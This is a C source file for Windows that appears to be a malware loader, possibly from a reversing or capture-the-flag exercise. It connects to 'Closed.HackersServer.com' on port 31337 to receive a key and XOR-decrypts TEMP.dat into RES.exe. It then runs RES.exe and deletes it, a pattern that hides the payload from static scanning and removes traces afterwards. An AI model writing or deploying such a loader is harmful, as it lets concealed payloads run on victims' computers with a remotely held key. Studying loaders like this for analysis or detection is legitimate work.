#define _CRT_SECURE_NO_WARNINGS 
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")

#include "resource6.h"


//char key[0x10] = "banana";
char key[0x10] = "";

int main(int argc, char * argv[]) {



	FILE* f, *f2, *f3;
	char buf[0x100] = { 0, };
	int length = 0;
	int readbyte = 0;

	WSADATA wsaData;
	SOCKET client;
	SOCKADDR_IN serveraddr;

	struct hostent * host_info;

	WSAStartup(0x0202, &wsaData);

	client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(31337);
	host_info = gethostbyname("Closed.HackersServer.com");

	serveraddr.sin_addr.s_addr = *(unsigned long*)(host_info->h_addr_list[0]);

	if (connect(client, (SOCKADDR*)&serveraddr, sizeof(serveraddr)) < 0) {
		exit(-1);
	}

	length = recv(client, buf, 0x100, 0);

	WSACleanup();


	memcpy(key, buf, length);

	f = fopen(".\\TEMP.dat", "r+b");
	f3 = fopen(".\\RES.exe", "w+b");

	if (f < 0 || f3 < 0) {
		fprintf(stderr, "file open error");
		exit(-1);
	}

	fseek(f, 0, SEEK_END);
	length = ftell(f);
	fseek(f, 0, SEEK_SET);


	while (ftell(f) != length) {
		readbyte = fread(buf, sizeof(char), 0x100, f);
		for (int i = 0; i < readbyte; i++) {
			buf[i] ^= key[i % strlen(key)] ^ 0xff;
		}

		fwrite(buf, sizeof(char), readbyte, f3);
	}

	fclose(f);
	fclose(f3);

	WinExec(".\\RES.exe", SW_SHOW);
	Sleep(1000);
	remove(".\\RES.exe");
}